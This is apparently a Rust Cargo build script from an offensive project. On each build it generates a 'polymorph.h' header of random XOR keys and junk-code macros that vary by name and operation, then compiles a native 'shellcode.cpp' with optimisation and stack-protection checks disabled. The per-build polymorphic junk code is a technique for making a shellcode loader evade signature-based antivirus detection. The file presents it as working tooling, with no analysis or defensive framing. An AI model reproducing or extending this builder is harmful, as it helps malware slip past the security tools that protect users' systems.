use std::env;
use std::fs::File;
use std::io::Write;
use std::path::Path;
use std::time::{SystemTime, UNIX_EPOCH};

struct XorShift(u64);

impl XorShift {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }

    fn next_u32(&mut self) -> u32 {
        self.next() as u32
    }

    fn rand_string(&mut self, len: usize) -> String {
        (0..len).map(|_| ((self.next() % 26) as u8 + b'a') as char).collect()
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let manifest_dir = env::var("CARGO_MANIFEST_DIR")?;
    let native_dir = Path::new(&manifest_dir).join("native");
    let poly_path = native_dir.join("polymorph.h");

    let seed = SystemTime::now().duration_since(UNIX_EPOCH)?.as_nanos() as u64;
    let mut prng = XorShift(seed);

    let mut f = File::create(&poly_path)?;

    writeln!(f, "#pragma once")?;
    writeln!(f, "// Seed: {:#018x}\n", seed)?;

    writeln!(f, "#define POLY_XOR_KEY1 {:#010x}u", prng.next_u32())?;
    writeln!(f, "#define POLY_XOR_KEY2 {:#010x}u\n", prng.next_u32())?;

    writeln!(f, "#define POLY_MAGIC1 {:#010x}u", prng.next_u32())?;
    writeln!(f, "#define POLY_MAGIC2 {:#010x}u", prng.next_u32())?;
    writeln!(f, "#define POLY_MAGIC3 {:#010x}u\n", prng.next_u32())?;

    writeln!(f, "#define poly_delay() do {{ \\")?;
    for i in 0..3 {
        writeln!(f, "    volatile unsigned int {}_{} = {:#010x}u; \\", prng.rand_string(6), i, prng.next_u32())?;
    }
    
    let loop_var = prng.rand_string(8);
    writeln!(f, "    volatile unsigned long long {} = 0; \\", loop_var)?;
    writeln!(f, "    for (unsigned long long _i = 0; _i < {}ull; _i++) {{ \\", (prng.next() % 100) + 10)?;
    writeln!(f, "        {} ^= _i ^ {:#010x}u; \\", loop_var, prng.next_u32())?;
    writeln!(f, "    }} \\")?;
    writeln!(f, "    (void){}; \\", loop_var)?;
    writeln!(f, "}} while(0)\n")?;

    writeln!(f, "#define poly_mutate() do {{ \\")?;
    let ops = ["+", "-", "^", "|", "&"];
    for _ in 0..4 {
        let var_name = prng.rand_string(5);
        let op = ops[(prng.next() as usize) % ops.len()];
        writeln!(f, "    volatile unsigned int {} = {:#010x}u; \\", var_name, prng.next_u32())?;
        writeln!(f, "    {} = {} {} {:#010x}u; \\", var_name, var_name, op, prng.next_u32())?;
        writeln!(f, "    (void){}; \\", var_name)?;
    }
    writeln!(f, "}} while(0)\n")?;
    
    drop(f);

    println!("cargo:warning=Polymorph seed: {:#018x}", seed);

    let mut build = cc::Build::new();
    build.cpp(true).file(native_dir.join("shellcode.cpp")).include(&native_dir);

    if env::var("CARGO_CFG_TARGET_ENV").unwrap_or_default() == "msvc" {
        build.flag("/Od").flag("/GS-").flag("/Gy").flag("/Zc:threadSafeInit-");
    } else {
        build.flag("-O0");
    }

    build.compile("shellcode");

    println!("cargo:rerun-if-changed=native/shellcode.cpp");
    println!("cargo:rerun-if-changed=native/shellcode.h");
    
    Ok(())
}
